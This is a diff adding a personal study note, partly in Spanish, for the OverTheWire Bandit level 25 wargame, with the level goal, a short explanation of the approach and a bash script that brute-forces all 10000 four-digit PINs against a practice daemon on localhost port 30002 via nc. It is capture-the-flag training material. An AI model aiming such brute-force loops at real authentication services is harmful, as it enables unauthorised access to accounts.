@@ -347,3 +347,41 @@ Ends the loop. Every file gets one pass.
 
 
 
+# Bandit 25
+
+
+Level Goal
+
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+You do not need to create new connections each time
+
+
+
+8️⃣ Idea central de la solución
+
+En términos simples:
+
+Generar todos los PINs posibles
+
+Para cada PIN:
+
+enviar password PIN
+
+Escuchar la respuesta
+
+Detectar cuándo cambia (cuando ya no dice “Wrong”)
+
+Eso es todo.
+
+
+
+
+
+
+ #!/bin/bash
+
+PASS="TU_PASSWORD_DE_BANDIT24"
+
+for pin in {0000..9999}; do
+    echo "$PASS $pin"
+done | nc localhost 30002 | grep -v "Wrong" | grep -v "I am"
